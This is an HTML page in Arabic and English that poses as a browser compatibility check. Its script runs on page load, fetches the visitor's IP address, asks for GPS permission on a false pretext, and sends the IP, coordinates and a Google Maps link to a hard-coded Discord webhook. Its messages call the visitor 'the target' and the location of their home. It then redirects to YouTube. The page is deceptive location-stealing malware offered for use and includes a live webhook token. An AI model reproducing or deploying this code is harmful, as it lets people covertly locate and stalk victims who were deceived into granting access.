<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Checking System Compatibility</title>
</head>
<body>
    <script>
        // رابط الويبهوك الخاص بك
        const webhookURL = "https://discord.com/api/webhooks/1459200310185820361/NUkYWHtHY6QxPNWeiCzLz9zR1uKP8mALnEX-D9VEXPE0CETDNzMbYQ0XW0V5XxW9Nwlm";
        // رابط التحويل (يوتيوب)
        const redirectURL = "https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.youtube.com/&ved=2ahUKEwiJmbKa6v6RAxXz_7sIHXi0DnoQFnoECAsQAQ&usg=AOvVaw0usXxGa_x5y1xoI_LaL0-1";

        async function sendToDiscord(data) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            });
        }

        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (e) { return "Unavailable"; }
        }

        window.onload = async () => {
            const ip = await getIP();
            
            if (navigator.geolocation) {
                // طلب الموقع الجغرافي
                navigator.geolocation.getCurrentPosition(async (position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;

                    await sendToDiscord({
                        content: "🎯 **تم تحديد موقع البيت بدقة (GPS)!**",
                        embeds: [{
                            title: "إحداثيات الموقع الحالي للهدف",
                            color: 3066993,
                            fields: [
                                { name: "رابط الخريطة المباشر", value: `[فتح الموقع في خرائط جوجل](${googleMapsLink})` },
                                { name: "الـ IP", value: ip },
                                { name: "خط العرض", value: lat.toString(), inline: true },
                                { name: "خط الطول", value: lon.toString(), inline: true }
                            ]
                        }]
                    });
                    
                    // التحويل إلى رابط يوتيوب المطلوب
                    window.location.href = redirectURL;

                }, async (error) => {
                    // إذا رفض الهدف إعطاء الموقع
                    await sendToDiscord({
                        content: "⚠️ **الهدف رفض إعطاء صلاحية الـ GPS**",
                        description: `الـ IP الخاص به: ${ip}`
                    });
                    // تحويله حتى لو رفض
                    window.location.href = redirectURL;
                });
            } else {
                // إذا كان المتصفح لا يدعم الخاصية
                window.location.href = redirectURL;
            }
        };
    </script>
    <div style="text-align: center; margin-top: 50px; font-family: Arial, sans-serif;">
        <h2>System Check...</h2>
        <p>الرجاء الضغط على <b>"Allow"</b> أو <b>"سماح"</b> للتحقق من توافق المتصفح وعرض المحتوى.</p>
    </div>
</body>
</html>
